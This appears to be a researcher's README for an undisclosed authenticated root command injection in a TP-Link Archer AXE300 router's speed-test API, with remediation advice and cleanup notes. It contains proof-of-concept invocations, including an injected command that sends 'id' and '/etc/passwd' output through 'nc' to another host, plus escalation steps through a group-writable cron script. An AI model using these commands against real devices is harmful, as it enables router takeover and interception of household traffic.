# TP-Link Archer AXE300 — authenticated command injection in the ISP Speed Test (root RCE)

**`spdt_server` is concatenated into a shell command string and executed as root.**

> **Disclosure status.**
> This finding has **not** been reported to TP-Link, **not** sent to any vendor, **not** shared
> with any third party, and **not** published in an advisory, mailing list post, blog,
> conference talk, preprint, issue tracker, or chat anywhere else. No prior disclosure exists.
>
> The test was performed on the owner's own hardware with the owner's explicit permission and
> credentials. The device was returned to its original state afterwards — see
> [`REPORT.md`](REPORT.md) §6 for the verification.

**Component:** Archer AXE300 (AXE16000 Quad-Band Wi-Fi 6E), hardware v1.0
**Firmware:** 1.0.11 Build 20241115 rel.76431(5553)
**Kernel:** Linux 4.19.183 aarch64 · BusyBox v1.19.4 · uhttpd + LuCI (Lua)
**Severity:** Critical (pre-auth: no · auth: admin session · user interaction: none)
**CWE:** CWE-78 (OS command injection) → CWE-88 (argument injection) → CWE-269 (improper privilege management)

**Author:** [@vindeckyy](https://github.com/vindeckyy) · **Date:** October 2026 · **License:** MIT (code), see [LICENSE](LICENSE)

**Legal notice:** Authorized research on hardware you own. No warranty, no liability, no
authorization to reach devices you do not own. Read the full
[Legal Disclaimer and Terms of Use](DISCLAIMER.md) before use.

---

## Abstract

The router's web UI exposes a JSON API at `/cgi-bin/luci/;stok=<token>/…`. One endpoint,
`/admin/speedtest?form=speedtest`, hands a request field straight to the shell:

```lua
-- /usr/lib/lua/luci/model/spdt.lua, SPEED_TEST_INST:start_spt(form)
spdt_url = form.spdt_server
sys.fork_call("echo " .. spdt_url .. " > /tmp/log/spdt_url")
```

`spdt_server` arrives from the request body and is concatenated into a command string with no
quoting and no validation. `sys.fork_call` runs that string through `/bin/sh -c`. One
authenticated request yields arbitrary command execution **as root**.

The same request can also enable persistent remote access: the firmware already ships a patched
dropbear on TCP/20001 that authenticates against the **web UI** account, and `admin` is a member
of the `root` group, which is enough to reach root again through a cron-executed script.

---

## At a glance

| | |
|---|---|
| Vulnerable endpoint | `POST /cgi-bin/luci/;stok=<token>/admin/speedtest?form=speedtest` |
| Vulnerable field | `spdt_server` |
| Vulnerable code | `/usr/lib/lua/luci/model/spdt.lua` — `SPEED_TEST_INST:start_spt()` |
| Trigger | `operation=start` |
| Privilege obtained | `uid=0(root)` |
| Auth required | Admin web UI session (`stok` token + `sysauth` cookie) |
| UI path | Advanced → Network → Internet → Speed Test |

### Proof, in one command

```console
$ python3 poc/axe300_spdt_poc.py --host 192.168.0.1 --password '<admin-password>' --sleep 5
[*] logging in to 192.168.0.1 ...
[+] authenticated, session token acquired (32 chars)
[*] baseline request: 0.060 s
[+] injected 'sleep 5': request returned after 5.066 s (baseline was 0.060 s)
[+] command injection confirmed: the response time tracks the requested sleep duration.
```

And with real command output, piped back to the test host:

```console
$ python3 poc/axe300_spdt_poc.py --host 192.168.0.1 --password '<admin-password>' \
      --cmd '(id; uname -a; head -2 /etc/passwd) | nc 192.168.0.99 4530'
```

Received on the test host:

```
uid=0(root) gid=0(root)
Linux Archer_AXE300 4.19.183 #1 SMP PREEMPT Thu Nov 23 20:35:02 CST 2023 aarch64 GNU/Linux
root:x:0:0:root:/root:/bin/ash
sftpadmin:x:1001:0:sftpadmin:/var:/bin/false
```

---

## Findings

### 1. Command injection in the ISP Speed Test — Critical

`spdt_server` → `sys.fork_call("echo " .. spdt_url .. …)` → `/bin/sh -c` → root shell.
Timing scales linearly with the injected sleep (2 s → 2062 ms, 5 s → 5063 ms, 8 s → 8061 ms
against a ~60 ms baseline), and command output was retrieved over the LAN.

Impact: full device compromise — read and rewrite every setting (including the stored admin
credential and Wi-Fi PSKs), install persistence, intercept all LAN traffic as the gateway,
modify firmware, or brick the device.

Fix: never build a shell string from request data. Use an argument vector, or validate the
value against a strict allowlist such as
`^https?://[A-Za-z0-9._-]+(:[0-9]{1,5})?/[A-Za-z0-9]+$`. Audit every
`sys.fork_call`/`os.execute` call in `/usr/lib/lua/luci/model/` that embeds request data — the
pattern `fork_call("…" .. <user input> .. "…")` is the bug class, and this call site is one
instance of it.

### 2. Remote SSH reachable with the web UI credential, and root escalation from it — High

The firmware ships a patched dropbear (v2019.78) already listening on **TCP/20001**:

```
/usr/sbin/dropbear -P /var/run/dropbear.1.pid -p 20001 -C -6 -B
```

`-C` selects *Web Server account login*, so the **web UI account and password are also the SSH
credentials**. `/sbin/knock_functions.sh` normally REJECTs TCP/20001 except for allow-listed
client IPs. A usable interactive session needed three device-side misconfigurations to be
repaired: `admin`'s shell was `/bin/false`, its home directory did not exist, and `/root` was
mode 0700 while the patched dropbear `chdir()`s there.

`admin` is in the `root` group (`root:x:0:admin,sftpadmin`), `/etc/hotplug.d/iface` is
group-writable, and cron runs `/bin/sh /etc/hotplug.d/iface/99-wportal` as root every minute.
Appending one line to that script from the SSH session produced a root-owned file containing
`uid=0(root) gid=0(root) groups=0(root)`.

Fix: keep interactive-capable accounts out of the root group; drop group-write permission from
executables and from scripts executed by root; ship a supported SSH implementation instead of
a patched dropbear that shares the web account's password and trusts only `ssh-rsa` (SHA-1).

### 3. Surfaces tested and found clean

Recorded so they are not re-tested. Diagnostics ping/traceroute (the target is parsed, not
shelled), the NTP server fields (normalized, not injected), `tmp_avira` /
CVE-2024-53375 (present but every `ownerId` is rejected by an owner check), the unauthenticated
admin API (the `stok` check holds), and the Wake-on-LAN and TR-069 forms (not served by this
build). Details in [`REPORT.md`](REPORT.md) §4.

---

## Repository layout

- [`REPORT.md`](REPORT.md) — the technical report: vulnerable code, both proof methods, impact,
  remediation, negative results, and the device cleanup record.
- [`poc/axe300_spdt_poc.py`](poc/axe300_spdt_poc.py) — standalone proof of concept. Speaks the
  router's own JSON API (RSA-encrypted password, AES-CBC encrypted body, RSA signature) and
  proves the injection with a timing oracle or an arbitrary command.
- [`evidence/`](evidence/) — the extracted vulnerable Lua source, the session-authentication
  finding that the PoC depends on, and the post-test device state.

## Requirements

- Python 3.9+ and the `cryptography` package (`pip install cryptography`).
- A device you own, or one you are authorised to test.

## PoC options

```
--host        target address (default 192.168.0.1)
--password    web UI password (or set AXE300_PASSWORD)
--sleep N     timing proof: inject `sleep N` and measure (default 5)
--cmd CMD     inject an arbitrary command instead of the timing proof
```

The PoC authenticates as the web UI account, so it needs the same credential you use for the
admin page. Note that the router locks the account after repeated failures
(`failureCount`/`attemptsAllowed` in the login response), so do not loop the PoC against a
router you rely on.

## Cleanup

Every change made during the research was reverted on the device: `/etc/passwd`,
`/etc/shadow`, `/etc/dropbear`, `/root` permissions and the temporary `tmpfs` mounted over it,
the hotplug script payload, the extra dropbear instances, and the temporary files. The vendor
dropbear was restarted with its original arguments on port 20001 and the web UI was verified
healthy afterwards. The exact before/after state is recorded in
[`REPORT.md`](REPORT.md) §6 and [`evidence/device-state-after.txt`](evidence/device-state-after.txt).
